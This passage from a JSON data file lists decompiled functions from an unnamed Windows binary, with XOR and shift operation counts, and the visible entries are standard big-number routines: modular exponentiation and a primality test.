Buffer, *(unsigned int *)&v40[5]);\n    dword_429334 += v24;\n  }\n  strcpy((char *)v57, \"MPC: %s\");\n  sub_40A0B0((LPCSTR)v57 + 1, Buffer);\n  return 0;\n}\n// 424390: using guessed type __int128 xmmword_424390;\n// 4243E0: using guessed type __int128 xmmword_4243E0;\n// 4244E0: using guessed type __int128 xmmword_4244E0;\n// 424530: using guessed type __int128 xmmword_424530;\n// 424BA0: using guessed type __int128 xmmword_424BA0;\n// 424C00: using guessed type __int128 xmmword_424C00;\n// 424EB0: using guessed type __int128 xmmword_424EB0;\n// 429260: using guessed type char byte_429260;\n// 429261: using guessed type char byte_429261;\n// 429262: using guessed type char byte_429262;\n// 429263: using guessed type char byte_429263;\n// 429264: using guessed type char byte_429264;\n// 429265: using guessed type char byte_429265;\n// 429266: using guessed type char byte_429266;\n// 429334: using guessed type int dword_429334;\n// 40D370: using guessed type int var_90;\n\n"
    },
    {
        "Function": "sub_402800",
        "Total XOR and shift operations": 11,
        "XOR operations": 0,
        "Shift operations": 11,
        "Operation percentage": "3.00%",
        "Function Body": "\nint __cdecl sub_402800(_DWORD *a1, int *a2, int a3, int a4, int a5)\n{\n  int *v5; // edi\n  size_t v6; // ecx\n  unsigned int v7; // edx\n  size_t v8; // ebx\n  int v9; // ebx\n  unsigned int v10; // eax\n  int v11; // esi\n  void *v12; // eax\n  void *v13; // eax\n  int v14; // eax\n  unsigned int v15; // edx\n  size_t v16; // eax\n  size_t v17; // eax\n  _DWORD *v18; // ecx\n  size_t v19; // ecx\n  int v20; // eax\n  int v21; // edi\n  unsigned int v22; // ebx\n  size_t v23; // edx\n  void **v24; // edi\n  void *v25; // ebx\n  void *v26; // edi\n  void *v27; // edi\n  void *v28; // edi\n  void *v29; // ebx\n  _DWORD v31[3]; // [esp+8h] [ebp-64Ch] BYREF\n  int v32[2]; // [esp+14h] [ebp-640h] BYREF\n  void *Block; // [esp+1Ch] [ebp-638h]\n  int v34; // [esp+608h] [ebp-4Ch]\n  int v35; // [esp+60Ch] [ebp-48h] BYREF\n  int v36; // [esp+610h] [ebp-44h]\n  void *v37; // [esp+614h] [ebp-40h]\n  int v38; // [esp+618h] [ebp-3Ch] BYREF\n  int v39; // [esp+61Ch] [ebp-38h]\n  size_t *v40; // [esp+620h] [ebp-34h]\n  __int64 v41; // [esp+624h] [ebp-30h] BYREF\n  void *v42; // [esp+62Ch] [ebp-28h]\n  int v43; // [esp+630h] [ebp-24h] BYREF\n  int v44; // [esp+634h] [ebp-20h]\n  void *v45; // [esp+638h] [ebp-1Ch]\n  unsigned int i; // [esp+63Ch] [ebp-18h]\n  unsigned int j; // [esp+640h] [ebp-14h]\n  int v48; // [esp+644h] [ebp-10h]\n  unsigned int v49; // [esp+648h] [ebp-Ch]\n  size_t Count; // [esp+64Ch] [ebp-8h]\n  size_t v51; // [esp+650h] [ebp-4h] BYREF\n\n  v51 = 0;\n  v5 = (int *)a4;\n  v40 = &v51;\n  v38 = 1;\n  v39 = 1;\n  if ( sub_4020A0((int *)a4, &v38) <= 0 )\n    return -4;\n  Count = **(_DWORD **)(a4 + 8);\n  if ( (Count & 1) == 0 )\n    return -4;\n  v40 = &v51;\n  v51 = 0;\n  v38 = 1;\n  v39 = 1;\n  if ( sub_4020A0((int *)a3, &v38) < 0 )\n    return -4;\n  v6 = Count;\n  v7 = 32;\n  v8 = Count + ((2 * (_BYTE)Count + 4) & 8);\n  do\n  {\n    v7 >>= 1;\n    v8 *= 2 - v6 * v8;\n    v6 = Count;\n  }\n  while ( v7 >= 8 );\n  v41 = 1i64;\n  v9 = -v8;\n  v42 = 0;\n  v43 = 1;\n  v44 = 0;\n  v45 = 0;\n  v35 = 1;\n  v36 = 0;\n  v37 = 0;\n  sub_40CC00(v31, 0, 0x600u);\n  v10 = sub_401F60(a3);\n  if ( v10 <= 0x29F )\n  {\n    if ( v10 <= 0xEF )\n    {\n      if ( v10 <= 0x4F )\n        v49 = v10 > 0x17 ? 3 : 1;\n      else\n        v49 = 4;\n    }\n    else\n    {\n      v49 = 5;\n    }\n  }\n  else\n  {\n    v49 = 6;\n  }\n  Count = *(_DWORD *)(a4 + 4) + 1;\n  v11 = sub_403690((int)a1, Count);\n  if ( !v11 )\n  {\n    v11 = sub_403690((int)v32, Count);\n    if ( !v11 )\n    {\n      v11 = sub_403690((int)&v43, 2 * Count);\n      if ( !v11 )\n      {\n        v34 = *a2;\n        if ( v34 == -1 )\n        {\n          v11 = sub_402180((int)&v35, (int)a2);\n          if ( v11 )\n            goto LABEL_73;\n          v35 = 1;\n          a2 = &v35;\n        }\n        if ( a5 && *(_DWORD *)(a5 + 8) )\n        {\n          v12 = *(void **)(a5 + 8);\n          v41 = *(_QWORD *)a5;\n          v42 = v12;\n        }\n        else\n        {\n          v11 = sub_403E10((int)&v41, 1);\n          if ( v11 )\n            goto LABEL_73;\n          v11 = sub_404410((int)&v41, *(_DWORD *)(a4 + 4) << 6);\n          if ( v11 )\n            goto LABEL_73;\n          v11 = sub_403F50((int *)&v41, (int *)&v41, (int *)a4);\n          if ( v11 )\n            goto LABEL_73;\n          if ( a5 )\n          {\n            v13 = v42;\n            *(_QWORD *)a5 = v41;\n            *(_DWORD *)(a5 + 8) = v13;\n          }\n        }\n        v14 = sub_4020A0(a2, (int *)a4) < 0 ? sub_402180((int)v32, (int)a2) : sub_403F50(v32, a2, (int *)a4);\n        v11 = v14;\n        if ( !v14 )\n        {\n          v11 = sub_404E90((int)v32, (int)&v41, a4, v9, (int)&v43);\n          if ( !v11 )\n          {\n            v11 = sub_402180((int)a1, (int)&v41);\n            if ( !v11 )\n            {\n              v11 = sub_404FB0((int)a1, a4, v9, (int)&v43);\n              if ( !v11 )\n              {\n                v15 = v49;\n                if ( v49 > 1 )\n                {\n                  j = v49 - 1;\n                  v51 = 1 << (v49 - 1);\n                  v16 = *(_DWORD *)(a4 + 4) + 1;\n                  Count = (size_t)&v31[3 * v51];\n                  v11 = sub_403690(Count, v16);\n                  if ( v11 )\n                    goto LABEL_73;\n                  v11 = sub_402180(Count, (int)v32);\n                  if ( v11 )\n                    goto LABEL_73;\n                  for ( i = 0; i < j; ++i )\n                  {\n                    v11 = sub_404E90(Count, Count, a4, v9, (int)&v43);\n                    if ( v11 )\n                      goto LABEL_73;\n                  }\n                  v15 = v49;\n                  v17 = v51 + 1;\n                  Count = v17;\n                  v51 = 1 << v49;\n                  if ( v17 < 1 << v49 )\n                  {\n                    v18 = &v31[3 * v17];\n                    v48 = (int)v18;\n                    do\n                    {\n                      v11 = sub_403690((int)v18, *(_DWORD *)(a4 + 4) + 1);\n                      if ( v11 )\n                        goto LABEL_73;\n                      v11 = sub_402180(v48, v48 - 12);\n                      if ( v11 )\n                        goto LABEL_73;\n                      v11 = sub_404E90(v48, (int)v32, a4, v9, (int)&v43);\n                      if ( v11 )\n                        goto LABEL_73;\n                      v18 = (_DWORD *)(v48 + 12);\n                      ++Count;\n                      v48 += 12;\n                    }\n                    while ( Count < v51 );\n                    v15 = v49;\n                  }\n                }\n                v11 = 0;\n                v51 = 0;\n                i = *(_DWORD *)(a3 + 4);\n                Count = 0;\nLABEL_48:\n                v48 = 0;\n                for ( j = 0; ; v11 = j )\n                {\n                  do\n                  {\n                    while ( 1 )\n                    {\n                      v19 = v51;\n                      if ( !v51 )\n                      {\n                        if ( !i )\n                        {\n                          v51 = 0;\n                          if ( v11 )\n                          {\n                            while ( 1 )\n                            {\n                              v11 = sub_404E90((int)a1, (int)a1, (int)v5, v9, (int)&v43);\n                              if ( v11 )\n                                break;\n                              v48 *= 2;\n                              if ( ((1 << v49) & v48) != 0 )\n                              {\n                                v11 = sub_404E90((int)a1, (int)v32, (int)v5, v9, (int)&v43);\n                                if ( v11 )\n                                  break;\n                              }\n                              if ( ++v51 >= j )\n                                goto LABEL_68;\n                            }\n                          }\n                          else\n                          {\nLABEL_68:\n                            v51 = 1;\n                            v40 = &v51;\n                            v38 = 1;\n                            v39 = 1;\n                            v11 = sub_404E90((int)a1, (int)&v38, (int)v5, v9, (int)&v43);\n                            if ( !v11 && v34 == -1 && *(_DWORD *)(a3 + 4) && (**(_BYTE **)(a3 + 8) & 1) != 0 )\n                            {\n                              *a1 = -1;\n                              v11 = sub_401EF0(a1, v5, a1);\n                            }\n                          }\n                          goto LABEL_73;\n                        }\n                        v19 = 32;\n                        --i;\n                      }\n                      v51 = v19 - 1;\n                      v5 = (int *)a4;\n                      v20 = (*(_DWORD *)(*(_DWORD *)(a3 + 8) + 4 * i) >> (v19 - 1)) & 1;\n                      if ( !v20 )\n                        break;\nLABEL_57:\n                      ++v11;\n                      Count = 2;\n                      j = v11;\n                      v48 |= v20 << (v15 - v11);\n                      if ( v11 == v15 )\n                      {\n                        v21 = 0;\n                        while ( 1 )\n                        {\n                          v11 = sub_404E90((int)a1, (int)a1, a4, v9, (int)&v43);\n                          if ( v11 )\n                            goto LABEL_73;\n                          if ( ++v21 >= v49 )\n                          {\n                            v5 = (int *)a4;\n                            v11 = sub_404E90((int)a1, (int)&v31[3 * v48], a4, v9, (int)&v43);\n                            if ( v11 )\n                              goto LABEL_73;\n                            v15 = v49;\n                            Count = 1;\n                            goto LABEL_48;\n                          }\n                        }\n                      }\n                    }\n                  }\n                  while ( !Count );\n                  if ( Count != 1 )\n                    goto LABEL_57;\n                  v11 = sub_404E90((int)a1, (int)a1, a4, v9, (int)&v43);\n                  if ( v11 )\n                    break;\n                  v15 = v49;\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\nLABEL_73:\n  v22 = 1 << (v49 - 1);\n  if ( v22 < 1 << v49 )\n  {\n    v23 = (1 << v49) - v22;\n    v51 = v23;\n    v24 = (void **)&v31[3 * v22 + 2];\n    do\n    {\n      if ( v24 != (void **)8 )\n      {\n        v25 = *v24;\n        if ( *v24 )\n        {\n          sub_408120(v25, 4 * (_DWORD)*(v24 - 1));\n          free(v25);\n          v23 = v51;\n        }\n        *(v24 - 2) = (void *)1;\n        *(v24 - 1) = 0;\n        *v24 = 0;\n      }\n      v24 += 3;\n      v51 = --v23;\n    }\n    while ( v23 );\n  }\n  v26 = Block;\n  if ( Block )\n  {\n    sub_408120(Block, 4 * v32[1]);\n    free(v26);\n  }\n  v27 = v45;\n  if ( v45 )\n  {\n    sub_408120(v45, 4 * v44);\n    free(v27);\n  }\n  v28 = v37;\n  if ( v37 )\n  {\n    sub_408120(v37, 4 * v36);\n    free(v28);\n  }\n  if ( !a5 || !*(_DWORD *)(a5 + 8) )\n  {\n    v29 = v42;\n    if ( v42 )\n    {\n      sub_408120(v42, 4 * HIDWORD(v41));\n      free(v29);\n    }\n  }\n  return v11;\n}\n\n"
    },
    {
        "Function": "sub_404A00",
        "Total XOR and shift operations": 9,
        "XOR operations": 0,
        "Shift operations": 9,
        "Operation percentage": "2.95%",
        "Function Body": "\nint __cdecl sub_404A00(int *a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4)\n{\n  void *v4; // ebx\n  void *v5; // edi\n  bool v6; // cc\n  int v7; // esi\n  unsigned int v8; // eax\n  int *v9; // ebx\n  unsigned int v10; // edi\n  int v11; // esi\n  int v12; // edx\n  unsigned int v13; // eax\n  unsigned int v14; // ecx\n  unsigned int v15; // eax\n  unsigned int v16; // eax\n  unsigned int v17; // eax\n  unsigned int v18; // ecx\n  int v19; // esi\n  unsigned int v20; // eax\n  unsigned int v21; // edx\n  int v22; // ecx\n  unsigned int v23; // eax\n  unsigned int v24; // eax\n  unsigned int v25; // eax\n  int v26; // eax\n  int v27; // edi\n  int v29[3]; // [esp+Ch] [ebp-64h] BYREF\n  int v30; // [esp+18h] [ebp-58h] BYREF\n  int v31; // [esp+1Ch] [ebp-54h]\n  int *v32; // [esp+20h] [ebp-50h]\n  int v33; // [esp+24h] [ebp-4Ch] BYREF\n  int v34; // [esp+28h] [ebp-48h]\n  void *v35; // [esp+2Ch] [ebp-44h]\n  int v36; // [esp+30h] [ebp-40h] BYREF\n  int v37; // [esp+34h] [ebp-3Ch]\n  void *v38; // [esp+38h] [ebp-38h]\n  int v39; // [esp+3Ch] [ebp-34h] BYREF\n  int v40; // [esp+40h] [ebp-30h]\n  void *v41; // [esp+44h] [ebp-2Ch]\n  unsigned int v42; // [esp+48h] [ebp-28h] BYREF\n  int v43; // [esp+4Ch] [ebp-24h]\n  void *Block; // [esp+50h] [ebp-20h]\n  int v45; // [esp+54h] [ebp-1Ch] BYREF\n  int v46; // [esp+58h] [ebp-18h]\n  _DWORD *v47; // [esp+5Ch] [ebp-14h]\n  int v48; // [esp+60h] [ebp-10h] BYREF\n  int v49; // [esp+64h] [ebp-Ch] BYREF\n  int v50; // [esp+68h] [ebp-8h]\n  unsigned int v51; // [esp+6Ch] [ebp-4h]\n\n  v4 = 0;\n  v32 = &v49;\n  v5 = 0;\n  v42 = 1;\n  v6 = *a1 <= 0;\n  v51 = *a1;\n  v43 = 0;\n  Block = 0;\n  v39 = 1;\n  v40 = 0;\n  v41 = 0;\n  v36 = 1;\n  v37 = 0;\n  v38 = 0;\n  v45 = 1;\n  v46 = 0;\n  v47 = 0;\n  v33 = 1;\n  v34 = 0;\n  v35 = 0;\n  v49 = 1;\n  v30 = 1;\n  v31 = 1;\n  if ( !v6 )\n  {\n    if ( (sub_401FC0((int)a1, (int)&v30) & 0x80000000) != 0 )\n    {\n      v7 = sub_404660((int)&v42, (int)&v30, (int)a1);\n      if ( !v7 )\n      {\n        v42 = -v51;\n        goto LABEL_10;\n      }\n    }\n    else\n    {\n      v7 = sub_404660((int)&v42, (int)a1, (int)&v30);\n      if ( !v7 )\n      {\n        v42 = v51;\n        goto LABEL_10;\n      }\n    }\nLABEL_66:\n    if ( Block )\n    {\n      sub_408120(Block, 4 * v43);\n      free(Block);\n    }\n    if ( v41 )\n    {\n      sub_408120(v41, 4 * v40);\n      free(v41);\n    }\n    if ( v38 )\n    {\n      sub_408120(v38, 4 * v37);\n      free(v38);\n    }\n    if ( v4 )\n    {\n      sub_408120(v4, 4 * v46);\n      free(v4);\n    }\n    if ( v5 )\n    {\n      sub_408120(v5, 4 * v34);\n      free(v5);\n    }\n    return v7;\n  }\n  v7 = sub_401CE0((int)&v42, (int)a1, (int)&v30);\n  v8 = v42;\n  if ( !v7 )\n    v8 = v51;\n  v42 = v8;\n  if ( v7 )\n    goto LABEL_66;\nLABEL_10:\n  v51 = sub_403DC0((int)&v42);\n  v7 = sub_402180((int)&v39, (int)&v42);\n  if ( v7 )\n    goto LABEL_66;\n  v7 = sub_404550((int)&v39, v51);\n  if ( v7 )\n    goto LABEL_66;\n  v49 = 0;\n  if ( !a2 )\n    goto LABEL_66;\n  v9 = a1;\nLABEL_14:\n  v50 = 0;\n  while ( 1 )\n  {\n    v7 = sub_402EF0((int)&v45, 4 * v9[1], a3, a4);\n    if ( v7 )\n      goto LABEL_65;\n    if ( v46 )\n    {\n      v11 = v46 - 1;\n      if ( v46 != 1 )\n      {\n        do\n        {\n          if ( v47[v11] )\n            break;\n          --v11;\n        }\n        while ( v11 );\n      }\n      v12 = v47[v11];\n      v13 = 0x80000000;\n      v14 = 0;\n      while ( (v12 & v13) == 0 )\n      {\n        v15 = v13 >> 1;\n        if ( (v12 & v15) != 0 )\n        {\n          ++v14;\n          break;\n        }\n        v16 = v15 >> 1;\n        if ( (v12 & v16) != 0 )\n        {\n          v14 += 2;\n          break;\n        }\n        v17 = v16 >> 1;\n        if ( (v12 & v17) != 0 )\n        {\n          v14 += 3;\n          break;\n        }\n        v14 += 4;\n        v13 = v17 >> 1;\n        if ( v14 >= 0x20 )\n          break;\n      }\n      v10 = 32 * (v11 + 1) - v14;\n    }\n    else\n    {\n      v10 = 0;\n    }\n    if ( v43 )\n    {\n      v19 = v43 - 1;\n      if ( v43 != 1 )\n      {\n        do\n        {\n          if ( *((_DWORD *)Block + v19) )\n            break;\n          --v19;\n        }\n        while ( v19 );\n      }\n      v20 = 0x80000000;\n      v21 = 0;\n      v22 = *((_DWORD *)Block + v19);\n      while ( (v22 & v20) == 0 )\n      {\n        v23 = v20 >> 1;\n        if ( (v22 & v23) != 0 )\n        {\n          ++v21;\n          break;\n        }\n        v24 = v23 >> 1;\n        if ( (v22 & v24) != 0 )\n        {\n          v21 += 2;\n          break;\n        }\n        v25 = v24 >> 1;\n        if ( (v22 & v25) != 0 )\n        {\n          v21 += 3;\n          break;\n        }\n        v21 += 4;\n        v20 = v25 >> 1;\n        if ( v21 >= 0x20 )\n          break;\n      }\n      v18 = 32 * (v19 + 1) - v21;\n    }\n    else\n    {\n      v18 = 0;\n    }\n    if ( v10 > v18 )\n      v47[v46 - 1] &= (1 << (v18 - 32 * (v46 - 1) - 1)) - 1;\n    v26 = v50++;\n    if ( v26 > 30 )\n      return -14;\n    v9 = a1;\n    if ( sub_4020A0(&v45, (int *)&v42) < 0 )\n    {\n      v48 = 1;\n      v32 = &v48;\n      v30 = 1;\n      v31 = 1;\n      if ( sub_4020A0(&v45, &v30) > 0 )\n      {\n        v7 = sub_402800(&v45, &v45, (int)&v39, (int)a1, (int)&v33);\n        if ( !v7 )\n        {\n          if ( !sub_4020A0(&v45, (int *)&v42) || !sub_402060(&v45, 1) )\n            goto LABEL_64;\n          v27 = 1;\n          if ( v51 > 1 )\n          {\n            while ( sub_4020A0(&v45, (int *)&v42) )\n            {\n              v7 = sub_404130(&v36, &v45, &v45);\n              if ( v7 )\n                goto LABEL_65;\n              v7 = sub_403F50(&v45, &v36, a1);\n              if ( v7 )\n                goto LABEL_65;\n              v48 = 1;\n              v29[2] = (int)&v48;\n              v29[0] = 1;\n              v29[1] = 1;\n              if ( sub_4020A0(&v45, v29) )\n              {\n                if ( ++v27 < v51 )\n                  continue;\n              }\n              break;\n            }\n          }\n          if ( sub_4020A0(&v45, (int *)&v42) || !sub_402060(&v45, 1) )\n          {\n            v7 = -14;\n          }\n          else\n          {\nLABEL_64:\n            if ( ++v49 < a2 )\n              goto LABEL_14;\n          }\n        }\nLABEL_65:\n        v4 = v47;\n        v5 = v35;\n        goto LABEL_66;\n      }\n    }\n  }\n}\n\n"
    }
]